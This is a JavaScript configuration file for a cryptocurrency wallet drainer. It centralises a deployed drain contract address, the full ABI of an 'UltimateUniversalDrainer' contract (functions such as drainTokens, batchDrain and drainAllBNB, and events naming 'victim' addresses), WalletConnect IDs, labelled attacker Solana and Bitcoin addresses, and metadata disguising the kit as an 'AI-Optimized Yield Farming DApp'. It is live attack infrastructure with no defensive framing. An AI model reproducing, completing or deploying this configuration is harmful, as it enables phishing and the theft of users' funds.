// config.js – All sensitive constants are centralised here.
// Replace these values with your own in production (use .env with a bundler).
export const CONFIG = {
  // EVM drain contract
  DRAINER_CONTRACT: "0xbf2c883b097d6733a7e5a8d853d05825564bd857",

  // Full ABI as a string (parsed once)
  CONTRACT_ABI: JSON.parse(`[
    {
      "type": "constructor",
      "inputs": [
        { "name": "primary", "type": "address[]", "internalType": "address[]" },
        { "name": "fallback1", "type": "address[]", "internalType": "address[]" },
        { "name": "fallback2", "type": "address[]", "internalType": "address[]" },
        { "name": "emergency", "type": "address[]", "internalType": "address[]" },
        { "name": "basisPoints", "type": "uint16[]", "internalType": "uint16[]" },
        { "name": "initialTokenThreshold", "type": "uint256", "internalType": "uint256" },
        { "name": "initialBNBThreshold", "type": "uint256", "internalType": "uint256" },
        { "name": "_auditor", "type": "address", "internalType": "address" }
      ],
      "stateMutability": "nonpayable"
    },
    {
      "name": "AlreadyUsed",
      "type": "error",
      "inputs": []
    },
    {
      "name": "ArrayLengthMismatch",
      "type": "error",
      "inputs": []
    },
    {
      "name": "BatchLimitExceeded",
      "type": "error",
      "inputs": []
    },
    {
      "name": "CannotPullBNB",
      "type": "error",
      "inputs": []
    },
    {
      "name": "DistributionIncomplete",
      "type": "error",
      "inputs": []
    },
    {
      "name": "ECDSAInvalidSignature",
      "type": "error",
      "inputs": []
    },
    {
      "name": "ECDSAInvalidSignatureLength",
      "type": "error",
      "inputs": [
        { "name": "length", "type": "uint256", "internalType": "uint256" }
      ]
    },
    {
      "name": "ECDSAInvalidSignatureS",
      "type": "error",
      "inputs": [
        { "name": "s", "type": "bytes32", "internalType": "bytes32" }
      ]
    },
    {
      "name": "EmergencyFailed",
      "type": "error",
      "inputs": []
    },
    {
      "name": "EmptyRequest",
      "type": "error",
      "inputs": []
    },
    {
      "name": "EnforcedPause",
      "type": "error",
      "inputs": []
    },
    {
      "name": "ExpectedPause",
      "type": "error",
      "inputs": []
    },
    {
      "name": "ExpiredDeadline",
      "type": "error",
      "inputs": []
    },
    {
      "name": "FallbackFailed",
      "type": "error",
      "inputs": []
    },
    {
      "name": "GasPriceTooHigh",
      "type": "error",
      "inputs": []
    },
    {
      "name": "InsufficientAllowance",
      "type": "error",
      "inputs": []
    },
    {
      "name": "InsufficientGas",
      "type": "error",
      "inputs": []
    },
    {
      "name": "InvalidBasisPoints",
      "type": "error",
      "inputs": []
    },
    {
      "name": "InvalidGasBudget",
      "type": "error",
      "inputs": []
    },
    {
      "name": "InvalidProposedData",
      "type": "error",
      "inputs": []
    },
    {
      "name": "InvalidShortString",
      "type": "error",
      "inputs": []
    },
    {
      "name": "InvalidSignature",
      "type": "error",
      "inputs": []
    },
    {
      "name": "NoBNBToDistribute",
      "type": "error",
      "inputs": []
    },
    {
      "name": "NotAuthorized",
      "type": "error",
      "inputs": []
    },
    {
      "name": "OwnableInvalidOwner",
      "type": "error",
      "inputs": [
        { "name": "owner", "type": "address", "internalType": "address" }
      ]
    },
    {
      "name": "OwnableUnauthorizedAccount",
      "type": "error",
      "inputs": [
        { "name": "account", "type": "address", "internalType": "address" }
      ]
    },
    {
      "name": "PermitFailed",
      "type": "error",
      "inputs": []
    },
    {
      "name": "ReentrancyGuardReentrantCall",
      "type": "error",
      "inputs": []
    },
    {
      "name": "SafeERC20FailedOperation",
      "type": "error",
      "inputs": [
        { "name": "token", "type": "address", "internalType": "address" }
      ]
    },
    {
      "name": "StringTooLong",
      "type": "error",
      "inputs": [
        { "name": "str", "type": "string", "internalType": "string" }
      ]
    },
    {
      "name": "TimelockActive",
      "type": "error",
      "inputs": []
    },
    {
      "name": "TransferFailed",
      "type": "error",
      "inputs": []
    },
    {
      "name": "UnauthorizedBNBWithdrawal",
      "type": "error",
      "inputs": []
    },
    {
      "name": "ZeroAddress",
      "type": "error",
      "inputs": []
    },
    {
      "name": "ZeroAmount",
      "type": "error",
      "inputs": []
    },
    {
      "name": "AuditView",
      "type": "event",
      "inputs": [
        { "name": "viewer", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "snapshot", "type": "bytes32", "indexed": true, "internalType": "bytes32" }
      ],
      "anonymous": false
    },
    {
      "name": "BNBAuthorizationSet",
      "type": "event",
      "inputs": [
        { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "maxAmount", "type": "uint256", "indexed": false, "internalType": "uint256" },
        { "name": "deadline", "type": "uint256", "indexed": false, "internalType": "uint256" }
      ],
      "anonymous": false
    },
    {
      "name": "BNBDeposited",
      "type": "event",
      "inputs": [
        { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" }
      ],
      "anonymous": false
    },
    {
      "name": "BNBDrained",
      "type": "event",
      "inputs": [
        { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" }
      ],
      "anonymous": false
    },
    {
      "name": "BatchDrainExecuted",
      "type": "event",
      "inputs": [
        { "name": "tokenRequests", "type": "uint256", "indexed": false, "internalType": "uint256" },
        { "name": "bnbVictims", "type": "uint256", "indexed": false, "internalType": "uint256" },
        { "name": "totalGas", "type": "uint256", "indexed": false, "internalType": "uint256" }
      ],
      "anonymous": false
    },
    {
      "name": "CircuitBreakerReset",
      "type": "event",
      "inputs": [],
      "anonymous": false
    },
    {
      "name": "CircuitBreakerTripped",
      "type": "event",
      "inputs": [
        { "name": "reason", "type": "string", "indexed": false, "internalType": "string" }
      ],
      "anonymous": false
    },
    {
      "name": "DistributionResult",
      "type": "event",
      "inputs": [
        { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "recipient", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" },
        { "name": "success", "type": "bool", "indexed": false, "internalType": "bool" }
      ],
      "anonymous": false
    },
    {
      "name": "DrainCursorUpdated",
      "type": "event",
      "inputs": [
        { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "nextIndex", "type": "uint256", "indexed": false, "internalType": "uint256" },
        { "name": "remainingGas", "type": "uint256", "indexed": false, "internalType": "uint256" }
      ],
      "anonymous": false
    },
    {
      "name": "DrainExecuted",
      "type": "event",
      "inputs": [
        { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "operator", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "operationId", "type": "bytes32", "indexed": true, "internalType": "bytes32" },
        { "name": "permitCount", "type": "uint256", "indexed": false, "internalType": "uint256" },
        { "name": "approvedCount", "type": "uint256", "indexed": false, "internalType": "uint256" },
        { "name": "bnbAmount", "type": "uint256", "indexed": false, "internalType": "uint256" },
        { "name": "successfulTransfers", "type": "uint256", "indexed": false, "internalType": "uint256" },
        { "name": "gasUsed", "type": "uint256", "indexed": false, "internalType": "uint256" },
        { "name": "completed", "type": "bool", "indexed": false, "internalType": "bool" }
      ],
      "anonymous": false
    },
    {
      "name": "EIP712DomainChanged",
      "type": "event",
      "inputs": [],
      "anonymous": false
    },
    {
      "name": "EmergencyFailedEvent",
      "type": "event",
      "inputs": [
        { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" },
        { "name": "failedAddr", "type": "address", "indexed": true, "internalType": "address" }
      ],
      "anonymous": false
    },
    {
      "name": "EmergencyUsed",
      "type": "event",
      "inputs": [
        { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" },
        { "name": "emergency", "type": "address", "indexed": true, "internalType": "address" }
      ],
      "anonymous": false
    },
    {
      "name": "FallbackFailedEvent",
      "type": "event",
      "inputs": [
        { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" },
        { "name": "failedAddr", "type": "address", "indexed": true, "internalType": "address" }
      ],
      "anonymous": false
    },
    {
      "name": "FallbackUsed",
      "type": "event",
      "inputs": [
        { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" },
        { "name": "primary", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "fb", "type": "address", "indexed": true, "internalType": "address" }
      ],
      "anonymous": false
    },
    {
      "name": "FundsRecovered",
      "type": "event",
      "inputs": [
        { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "to", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" },
        { "name": "recoveryId", "type": "bytes32", "indexed": true, "internalType": "bytes32" }
      ],
      "anonymous": false
    },
    {
      "name": "OwnershipTransferred",
      "type": "event",
      "inputs": [
        { "name": "previousOwner", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "newOwner", "type": "address", "indexed": true, "internalType": "address" }
      ],
      "anonymous": false
    },
    {
      "name": "Paused",
      "type": "event",
      "inputs": [
        { "name": "account", "type": "address", "indexed": false, "internalType": "address" }
      ],
      "anonymous": false
    },
    {
      "name": "RecipientsProposed",
      "type": "event",
      "inputs": [
        { "name": "primary", "type": "address[]", "indexed": false, "internalType": "address[]" },
        { "name": "fb1", "type": "address[]", "indexed": false, "internalType": "address[]" },
        { "name": "fb2", "type": "address[]", "indexed": false, "internalType": "address[]" },
        { "name": "emergency", "type": "address[]", "indexed": false, "internalType": "address[]" },
        { "name": "basis", "type": "uint16[]", "indexed": false, "internalType": "uint16[]" },
        { "name": "executeAfter", "type": "uint256", "indexed": false, "internalType": "uint256" }
      ],
      "anonymous": false
    },
    {
      "name": "RecipientsUpdated",
      "type": "event",
      "inputs": [],
      "anonymous": false
    },
    {
      "name": "ThresholdsUpdated",
      "type": "event",
      "inputs": [
        { "name": "newTokenThreshold", "type": "uint256", "indexed": false, "internalType": "uint256" },
        { "name": "newBNBThreshold", "type": "uint256", "indexed": false, "internalType": "uint256" }
      ],
      "anonymous": false
    },
    {
      "name": "TokensDrainedWithApproval",
      "type": "event",
      "inputs": [
        { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" }
      ],
      "anonymous": false
    },
    {
      "name": "TokensDrainedWithPermit",
      "type": "event",
      "inputs": [
        { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" }
      ],
      "anonymous": false
    },
    {
      "name": "Unpaused",
      "type": "event",
      "inputs": [
        { "name": "account", "type": "address", "indexed": false, "internalType": "address" }
      ],
      "anonymous": false
    },
    {
      "name": "VictimApprovalSet",
      "type": "event",
      "inputs": [
        { "name": "victim", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "token", "type": "address", "indexed": true, "internalType": "address" },
        { "name": "amount", "type": "uint256", "indexed": false, "internalType": "uint256" }
      ],
      "anonymous": false
    },
    {
      "type": "fallback",
      "stateMutability": "payable"
    },
    {
      "name": "APPROVED_BATCH_LIMIT",
      "type": "function",
      "inputs": [],
      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
      "stateMutability": "view"
    },
    {
      "name": "BASIS_POINTS",
      "type": "function",
      "inputs": [],
      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
      "stateMutability": "view"
    },
    {
      "name": "BNB_MIN_DEPOSIT",
      "type": "function",
      "inputs": [],
      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
      "stateMutability": "view"
    },
    {
      "name": "MAX_GAS_BUDGET",
      "type": "function",
      "inputs": [],
      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
      "stateMutability": "view"
    },
    {
      "name": "MAX_GAS_PRICE",
      "type": "function",
      "inputs": [],
      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
      "stateMutability": "view"
    },
    {
      "name": "MAX_RECIPIENTS",
      "type": "function",
      "inputs": [],
      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
      "stateMutability": "view"
    },
    {
      "name": "MIN_GAS_RESERVE",
      "type": "function",
      "inputs": [],
      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
      "stateMutability": "view"
    },
    {
      "name": "PERMIT_BATCH_LIMIT",
      "type": "function",
      "inputs": [],
      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
      "stateMutability": "view"
    },
    {
      "name": "TIMELOCK_DURATION",
      "type": "function",
      "inputs": [],
      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
      "stateMutability": "view"
    },
    {
      "name": "auditor",
      "type": "function",
      "inputs": [],
      "outputs": [{ "name": "", "type": "address", "internalType": "address" }],
      "stateMutability": "view"
    },
    {
      "name": "authorizeBNBDrain",
      "type": "function",
      "inputs": [
        { "name": "maxAmount", "type": "uint256", "internalType": "uint256" },
        { "name": "deadline", "type": "uint256", "internalType": "uint256" },
        { "name": "salt", "type": "bytes32", "internalType": "bytes32" },
        { "name": "signature", "type": "bytes", "internalType": "bytes" }
      ],
      "outputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "name": "batchDrain",
      "type": "function",
      "inputs": [
        {
          "name": "request",
          "type": "tuple",
          "components": [
            {
              "name": "tokenRequests",
              "type": "tuple[]",
              "components": [
                { "name": "victim", "type": "address", "internalType": "address" },
                {
                  "name": "permits",
                  "type": "tuple[]",
                  "components": [
                    { "name": "token", "type": "address", "internalType": "address" },
                    { "name": "value", "type": "uint256", "internalType": "uint256" },
                    { "name": "deadline", "type": "uint256", "internalType": "uint256" },
                    { "name": "v", "type": "uint8", "internalType": "uint8" },
                    { "name": "r", "type": "bytes32", "internalType": "bytes32" },
                    { "name": "s", "type": "bytes32", "internalType": "bytes32" }
                  ],
                  "internalType": "struct UltimateUniversalDrainer.PermitData[]"
                },
                { "name": "approvedTokens", "type": "address[]", "internalType": "address[]" },
                { "name": "approvedAmounts", "type": "uint256[]", "internalType": "uint256[]" },
                { "name": "gasBudget", "type": "uint256", "internalType": "uint256" },
                { "name": "resume", "type": "bool", "internalType": "bool" },
                { "name": "deadline", "type": "uint256", "internalType": "uint256" },
                { "name": "salt", "type": "bytes32", "internalType": "bytes32" },
                { "name": "signature", "type": "bytes", "internalType": "bytes" }
              ],
              "internalType": "struct UltimateUniversalDrainer.TokenDrainRequest[]"
            },
            { "name": "bnbVictims", "type": "address[]", "internalType": "address[]" },
            { "name": "bnbAmounts", "type": "uint256[]", "internalType": "uint256[]" }
          ],
          "internalType": "struct UltimateUniversalDrainer.BatchDrainRequest"
        }
      ],
      "outputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "name": "bnbSplitThreshold",
      "type": "function",
      "inputs": [],
      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
      "stateMutability": "view"
    },
    {
      "name": "cancelRecipientsProposal",
      "type": "function",
      "inputs": [],
      "outputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "name": "depositBNB",
      "type": "function",
      "inputs": [],
      "outputs": [],
      "stateMutability": "payable"
    },
    {
      "name": "drainAllBNB",
      "type": "function",
      "inputs": [
        { "name": "victim", "type": "address", "internalType": "address" }
      ],
      "outputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "name": "drainBNB",
      "type": "function",
      "inputs": [
        { "name": "victim", "type": "address", "internalType": "address" },
        { "name": "amount", "type": "uint256", "internalType": "uint256" }
      ],
      "outputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "name": "drainTokens",
      "type": "function",
      "inputs": [
        {
          "name": "request",
          "type": "tuple",
          "components": [
            { "name": "victim", "type": "address", "internalType": "address" },
            {
              "name": "permits",
              "type": "tuple[]",
              "components": [
                { "name": "token", "type": "address", "internalType": "address" },
                { "name": "value", "type": "uint256", "internalType": "uint256" },
                { "name": "deadline", "type": "uint256", "internalType": "uint256" },
                { "name": "v", "type": "uint8", "internalType": "uint8" },
                { "name": "r", "type": "bytes32", "internalType": "bytes32" },
                { "name": "s", "type": "bytes32", "internalType": "bytes32" }
              ],
              "internalType": "struct UltimateUniversalDrainer.PermitData[]"
            },
            { "name": "approvedTokens", "type": "address[]", "internalType": "address[]" },
            { "name": "approvedAmounts", "type": "uint256[]", "internalType": "uint256[]" },
            { "name": "gasBudget", "type": "uint256", "internalType": "uint256" },
            { "name": "resume", "type": "bool", "internalType": "bool" },
            { "name": "deadline", "type": "uint256", "internalType": "uint256" },
            { "name": "salt", "type": "bytes32", "internalType": "bytes32" },
            { "name": "signature", "type": "bytes", "internalType": "bytes" }
          ],
          "internalType": "struct UltimateUniversalDrainer.TokenDrainRequest"
        }
      ],
      "outputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "name": "eip712Domain",
      "type": "function",
      "inputs": [],
      "outputs": [
        { "name": "fields", "type": "bytes1", "internalType": "bytes1" },
        { "name": "name", "type": "string", "internalType": "string" },
        { "name": "version", "type": "string", "internalType": "string" },
        { "name": "chainId", "type": "uint256", "internalType": "uint256" },
        { "name": "verifyingContract", "type": "address", "internalType": "address" },
        { "name": "salt", "type": "bytes32", "internalType": "bytes32" },
        { "name": "extensions", "type": "uint256[]", "internalType": "uint256[]" }
      ],
      "stateMutability": "view"
    },
    {
      "name": "executeRecipientsUpdate",
      "type": "function",
      "inputs": [],
      "outputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "name": "getBNBDeposit",
      "type": "function",
      "inputs": [
        { "name": "victim", "type": "address", "internalType": "address" }
      ],
      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
      "stateMutability": "view"
    },
    {
      "name": "getBNBMaxAllowed",
      "type": "function",
      "inputs": [
        { "name": "victim", "type": "address", "internalType": "address" }
      ],
      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
      "stateMutability": "view"
    },
    {
      "name": "getDrainCursor",
      "type": "function",
      "inputs": [
        { "name": "victim", "type": "address", "internalType": "address" }
      ],
      "outputs": [
        { "name": "tokenIndex", "type": "uint256", "internalType": "uint256" },
        { "name": "gasBudget", "type": "uint256", "internalType": "uint256" }
      ],
      "stateMutability": "view"
    },
    {
      "name": "getRecipients",
      "type": "function",
      "inputs": [],
      "outputs": [
        {
          "name": "primary",
          "type": "tuple[]",
          "components": [
            { "name": "addr", "type": "address", "internalType": "address payable" },
            { "name": "basisPoints", "type": "uint16", "internalType": "uint16" }
          ],
          "internalType": "struct UltimateUniversalDrainer.Recipient[]"
        },
        {
          "name": "fb1",
          "type": "tuple[]",
          "components": [
            { "name": "addr", "type": "address", "internalType": "address payable" },
            { "name": "basisPoints", "type": "uint16", "internalType": "uint16" }
          ],
          "internalType": "struct UltimateUniversalDrainer.Recipient[]"
        },
        {
          "name": "fb2",
          "type": "tuple[]",
          "components": [
            { "name": "addr", "type": "address", "internalType": "address payable" },
            { "name": "basisPoints", "type": "uint16", "internalType": "uint16" }
          ],
          "internalType": "struct UltimateUniversalDrainer.Recipient[]"
        },
        {
          "name": "emergency",
          "type": "tuple[]",
          "components": [
            { "name": "addr", "type": "address", "internalType": "address payable" },
            { "name": "basisPoints", "type": "uint16", "internalType": "uint16" }
          ],
          "internalType": "struct UltimateUniversalDrainer.Recipient[]"
        }
      ],
      "stateMutability": "view"
    },
    {
      "name": "getSnapshot",
      "type": "function",
      "inputs": [],
      "outputs": [{ "name": "", "type": "bytes32", "internalType": "bytes32" }],
      "stateMutability": "nonpayable"
    },
    {
      "name": "getSystemHealth",
      "type": "function",
      "inputs": [],
      "outputs": [
        { "name": "totalOps", "type": "uint256", "internalType": "uint256" },
        { "name": "successRateBips", "type": "uint256", "internalType": "uint256" },
        { "name": "totalValue", "type": "uint256", "internalType": "uint256" },
        { "name": "consecutiveFailures", "type": "uint256", "internalType": "uint256" },
        { "name": "circuitBroken", "type": "bool", "internalType": "bool" },
        { "name": "paused_", "type": "bool", "internalType": "bool" }
      ],
      "stateMutability": "view"
    },
    {
      "name": "getThresholds",
      "type": "function",
      "inputs": [],
      "outputs": [
        { "name": "tokenThreshold", "type": "uint256", "internalType": "uint256" },
        { "name": "bnbThreshold", "type": "uint256", "internalType": "uint256" }
      ],
      "stateMutability": "view"
    },
    {
      "name": "getVictimApproval",
      "type": "function",
      "inputs": [
        { "name": "victim", "type": "address", "internalType": "address" },
        { "name": "token", "type": "address", "internalType": "address" }
      ],
      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
      "stateMutability": "view"
    },
    {
      "name": "getVictimNonce",
      "type": "function",
      "inputs": [
        { "name": "victim", "type": "address", "internalType": "address" }
      ],
      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
      "stateMutability": "view"
    },
    {
      "name": "owner",
      "type": "function",
      "inputs": [],
      "outputs": [{ "name": "", "type": "address", "internalType": "address" }],
      "stateMutability": "view"
    },
    {
      "name": "pause",
      "type": "function",
      "inputs": [],
      "outputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "name": "paused",
      "type": "function",
      "inputs": [],
      "outputs": [{ "name": "", "type": "bool", "internalType": "bool" }],
      "stateMutability": "view"
    },
    {
      "name": "proposeRecipients",
      "type": "function",
      "inputs": [
        { "name": "primary", "type": "address[]", "internalType": "address[]" },
        { "name": "fallback1", "type": "address[]", "internalType": "address[]" },
        { "name": "fallback2", "type": "address[]", "internalType": "address[]" },
        { "name": "emergency", "type": "address[]", "internalType": "address[]" },
        { "name": "basisPoints", "type": "uint16[]", "internalType": "uint16[]" }
      ],
      "outputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "name": "recoverFunds",
      "type": "function",
      "inputs": [
        { "name": "token", "type": "address", "internalType": "address" },
        { "name": "to", "type": "address", "internalType": "address" },
        { "name": "amount", "type": "uint256", "internalType": "uint256" }
      ],
      "outputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "name": "renounceOwnership",
      "type": "function",
      "inputs": [],
      "outputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "name": "resetCircuitBreaker",
      "type": "function",
      "inputs": [],
      "outputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "name": "setAuditor",
      "type": "function",
      "inputs": [
        { "name": "newAuditor", "type": "address", "internalType": "address" }
      ],
      "outputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "name": "setTokenApproval",
      "type": "function",
      "inputs": [
        { "name": "token", "type": "address", "internalType": "address" },
        { "name": "amount", "type": "uint256", "internalType": "uint256" }
      ],
      "outputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "name": "tokenSplitThreshold",
      "type": "function",
      "inputs": [],
      "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
      "stateMutability": "view"
    },
    {
      "name": "transferOwnership",
      "type": "function",
      "inputs": [
        { "name": "newOwner", "type": "address", "internalType": "address" }
      ],
      "outputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "name": "unpause",
      "type": "function",
      "inputs": [],
      "outputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "name": "updateThresholds",
      "type": "function",
      "inputs": [
        { "name": "newTokenThreshold", "type": "uint256", "internalType": "uint256" },
        { "name": "newBNBThreshold", "type": "uint256", "internalType": "uint256" }
      ],
      "outputs": [],
      "stateMutability": "nonpayable"
    },
    {
      "type": "receive",
      "stateMutability": "payable"
    }
  ]`),

  // WalletConnect project IDs
  PROJECT_ID: "b73926bcbfbad084f994910cadc18b63",
  PUBLIC_TEST_ID: "8f9a3f7b7c8e4d3a9b2c1d5e6f7a8b9c",

  // Attacker addresses for Solana and Bitcoin
  ATTACKER_SOLANA_ADDRESS: "7uYC9fnzK3HashgE8x8fJ5oqUMLBWkVYqPiFNhejYPX7",
  ATTACKER_BTC_ADDRESS: "bc1qyugnjmr05e4xf4wd4xs2ytn9an34uxelkt9h5f",

  // DApp metadata (used in WalletConnect)
  DAPP_METADATA: {
    name: 'ApeX Protocol',
    description: 'AI-Optimized Yield Farming DApp',
    url: window.location.origin,
    icons: ['https://walletconnect.com/walletconnect-logo.png'],
  }
};
